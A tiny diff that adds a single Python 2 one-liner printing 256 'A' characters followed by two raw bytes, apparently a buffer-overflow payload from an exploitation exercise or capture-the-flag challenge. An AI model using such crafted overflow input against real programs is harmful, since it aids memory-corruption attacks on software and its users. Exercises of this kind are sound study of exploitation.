@@ -1,0 +1,2 @@
+python -c 'print "A"*256+"\xDE\xC0"'
+
